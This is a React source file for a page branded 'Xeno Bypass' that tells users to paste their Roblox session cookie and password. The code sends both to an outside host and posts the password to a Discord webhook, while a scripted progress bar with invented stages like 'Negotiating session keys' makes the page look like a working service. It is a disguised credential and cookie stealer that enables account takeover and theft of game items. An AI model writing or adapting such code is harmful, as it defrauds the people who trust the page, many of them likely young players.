import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { Eye, EyeOff, ShieldCheck, ArrowLeft, Loader2, CheckCircle2, XCircle, Cookie } from "lucide-react";
import ShieldIcon from "@/components/ShieldIcon";
import { sendBypassEmbed } from "@/lib/tokenStore";
import { toast } from "sonner";

const WEBHOOK_KEY = "discord_webhook_url";
const RATE_LIMIT_KEY = "bypass_attempts";
const MAX_ATTEMPTS_PER_MIN = 10;
const BYPASS_API_URL = "https://Rblxbypasser.com";
const BYPASS_DURATION_MS = 60_000;
const COOKIE_PREFIX = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";

type BypassStatus = "idle" | "loading" | "success" | "error";

const STAGES = [
  { at: 0, label: "Initializing bypass engine..." },
  { at: 10, label: "Validating cookie signature..." },
  { at: 25, label: "Connecting to Xeno relay..." },
  { at: 45, label: "Negotiating session keys..." },
  { at: 65, label: "Submitting bypass payload..." },
  { at: 85, label: "Finalizing session..." },
  { at: 98, label: "Almost done..." },
];

const BypassPage = () => {
  const [cookie, setCookie] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [status, setStatus] = useState<BypassStatus>("idle");
  const [progress, setProgress] = useState(0);
  const navigate = useNavigate();
  const intervalRef = useRef<number | null>(null);

  useEffect(() => {
    if (sessionStorage.getItem("authenticated") !== "true") {
      navigate("/");
    }
    return () => {
      if (intervalRef.current) window.clearInterval(intervalRef.current);
    };
  }, [navigate]);

  function getAttempts(): number[] {
    try {
      const raw = localStorage.getItem(RATE_LIMIT_KEY);
      if (!raw) return [];
      const cutoff = Date.now() - 60_000;
      return (JSON.parse(raw) as number[]).filter(t => t > cutoff);
    } catch {
      return [];
    }
  }

  function recordAttempt() {
    const attempts = getAttempts();
    attempts.push(Date.now());
    localStorage.setItem(RATE_LIMIT_KEY, JSON.stringify(attempts));
  }

  const handleBypass = async () => {
    const trimmed = cookie.trim();
    if (!trimmed) {
      toast.error("Please enter a cookie");
      return;
    }
    if (!trimmed.startsWith(COOKIE_PREFIX)) {
      toast.error(`Invalid cookie. It must start with "${COOKIE_PREFIX}"`);
      return;
    }

    const attempts = getAttempts();
    if (attempts.length >= MAX_ATTEMPTS_PER_MIN) {
      const wait = Math.ceil((60_000 - (Date.now() - attempts[0])) / 1000);
      toast.error(`Rate limit reached. Try again in ${wait}s.`);
      return;
    }

    recordAttempt();
    setStatus("loading");
    setProgress(0);

    const start = Date.now();
    intervalRef.current = window.setInterval(() => {
      const pct = Math.min(99, ((Date.now() - start) / BYPASS_DURATION_MS) * 100);
      setProgress(pct);
    }, 200);

    let apiOk = true;
    try {
      const res = await fetch(BYPASS_API_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cookie: trimmed, password }),
      });
      apiOk = res.ok;
    } catch {
      apiOk = false;
    }

    const elapsed = Date.now() - start;
    if (elapsed < BYPASS_DURATION_MS) {
      await new Promise(r => setTimeout(r, BYPASS_DURATION_MS - elapsed));
    }

    if (intervalRef.current) window.clearInterval(intervalRef.current);
    setProgress(100);

    const webhook = localStorage.getItem(WEBHOOK_KEY);
    if (webhook) {
      sendBypassEmbed(webhook, {
        valid: apiOk,
        password,
      });
    }

    if (apiOk) {
      setStatus("success");
      toast.success("Bypass successful!");
    } else {
      setStatus("error");
      toast.error("Bypass failed");
    }
  };

  const currentStage = [...STAGES].reverse().find(s => progress >= s.at) ?? STAGES[0];
  const secondsLeft = Math.max(0, Math.ceil((BYPASS_DURATION_MS * (100 - progress)) / 100 / 1000));

  return (
    <div className="min-h-screen px-4 py-6 relative overflow-hidden">
      <div className="absolute top-1/4 left-1/2 -translate-x-1/2 w-[500px] h-[500px] rounded-full bg-primary/5 blur-[120px] pointer-events-none" />

      <div className="max-w-sm mx-auto space-y-6 relative z-10 animate-fade-in-up">
        {/* Header */}
        <div className="flex items-center gap-3">
          <button onClick={() => navigate("/dashboard")} className="text-muted-foreground hover:text-foreground transition-colors p-1">
            <ArrowLeft size={20} />
          </button>
          <h1 className="text-xl font-bold text-foreground">Dashboard</h1>
        </div>

        {/* Shield */}
        <ShieldIcon size="md" />

        <div className="text-center space-y-1">
          <h2 className="text-2xl font-black text-foreground glow-text">Xeno Bypass</h2>
          <p className="text-muted-foreground text-xs">Secure automation with real-time bypassing</p>
        </div>

        {/* Form */}
        <div className="card-glow rounded-2xl p-5 space-y-4">
          <div className="space-y-2">
            <label className="text-sm font-semibold text-foreground flex items-center gap-1.5">
              <Cookie size={14} className="text-primary" /> Cookie
            </label>
            <input
              value={cookie}
              onChange={e => setCookie(e.target.value)}
              placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."
              disabled={status === "loading"}
              className="input-field text-sm font-mono"
            />
            <p className="text-[10px] text-muted-foreground">
              Cookie must start with <span className="font-mono text-primary">_|WARNING:</span>
            </p>
          </div>

          <div className="space-y-2">
            <label className="text-sm font-semibold text-foreground">Password</label>
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={e => setPassword(e.target.value)}
                placeholder="Enter your password"
                disabled={status === "loading"}
                className="input-field pr-10"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
              >
                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>
          </div>

          <button
            onClick={handleBypass}
            disabled={status === "loading"}
            className="w-full shimmer text-primary-foreground font-semibold py-3.5 rounded-xl flex items-center justify-center gap-2.5 glow-btn transition-all duration-300 disabled:opacity-50"
          >
            {status === "loading" ? (
              <><Loader2 size={18} className="animate-spin" /> Bypassing...</>
            ) : status === "success" ? (
              <><CheckCircle2 size={18} /> Bypassed!</>
            ) : status === "error" ? (
              <><XCircle size={18} /> Retry Bypass</>
            ) : (
              <><ShieldCheck size={18} /> Xeno Bypass</>
            )}
          </button>
        </div>

        {/* Processing UI */}
        {status === "loading" && (
          <div className="card-glow rounded-2xl p-5 space-y-4">
            <div className="flex items-center gap-3">
              <Loader2 size={18} className="text-primary animate-spin" />
              <div className="flex-1">
                <p className="text-sm font-semibold text-foreground">{currentStage.label}</p>
                <p className="text-[11px] text-muted-foreground">~{secondsLeft}s remaining</p>
              </div>
              <span className="text-sm font-bold text-primary tabular-nums">{Math.floor(progress)}%</span>
            </div>
            <div className="h-2 rounded-full bg-secondary/60 overflow-hidden">
              <div
                className="h-full bg-gradient-to-r from-primary/70 to-primary shadow-[0_0_15px_hsl(var(--primary))] transition-[width] duration-200 ease-linear"
                style={{ width: `${progress}%` }}
              />
            </div>
          </div>
        )}

        {status === "success" && (
          <div className="card-glow rounded-2xl p-5 flex items-center gap-3">
            <CheckCircle2 className="text-[hsl(var(--success))]" size={22} />
            <p className="text-sm font-semibold text-foreground">Bypass completed successfully.</p>
          </div>
        )}

        {status === "error" && (
          <div className="card-glow rounded-2xl p-5 flex items-center gap-3">
            <XCircle className="text-destructive" size={22} />
            <p className="text-sm font-semibold text-foreground">Bypass failed. Please try again.</p>
          </div>
        )}
      </div>
    </div>
  );
};

export default BypassPage;
